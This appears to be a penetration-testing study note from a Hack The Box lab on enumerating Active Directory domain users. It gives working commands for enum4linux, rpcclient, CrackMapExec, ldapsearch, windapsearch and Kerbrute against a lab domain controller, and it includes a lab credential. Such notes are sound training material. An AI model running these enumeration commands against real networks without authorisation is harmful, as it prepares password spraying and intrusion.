## Detailed User Enumeration

- By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
- Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
- Using a tool such as `Kerbrute` to validate users utilizing a word list from a source such as the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo, or gathered by using a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to create a list of potentially valid users
- Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using `Responder` or even a successful password spray using a smaller wordlist

## SMB NULL Session to Pull User List
#### Using enum4linux

```shell
3kjS@htb[/htb]$ enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
![[Screenshot 2026-05-25 at 14.02.14.png]]
#### Using rpcclient

```shell
3kjS@htb[/htb]$ rpcclient -U "" -N 172.16.5.5
```
![[Screenshot 2026-05-25 at 14.01.50.png]]
#### Using CrackMapExec --users Flag

```shell
3kjS@htb[/htb]$ crackmapexec smb 172.16.5.5 --users
```
![[Screenshot 2026-05-25 at 14.01.30.png]]
## Gathering Users with LDAP Anonymous
#### Using ldapsearch

```shell
3kjS@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```
![[Screenshot 2026-05-25 at 14.03.18.png]]
#### Using windapsearch

```shell
3kjS@htb[/htb]$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```
![[Screenshot 2026-05-25 at 14.03.41.png]]
## Enumerating Users with Kerbrute
#### Kerbrute User Enumeration

```shell
3kjS@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```
![[Screenshot 2026-05-25 at 14.04.26.png]]
## Credentialed Enumeration to Build our User List
#### Using CrackMapExec with Valid Credentials

```shell
3kjS@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```
![[Screenshot 2026-05-25 at 14.05.14.png]]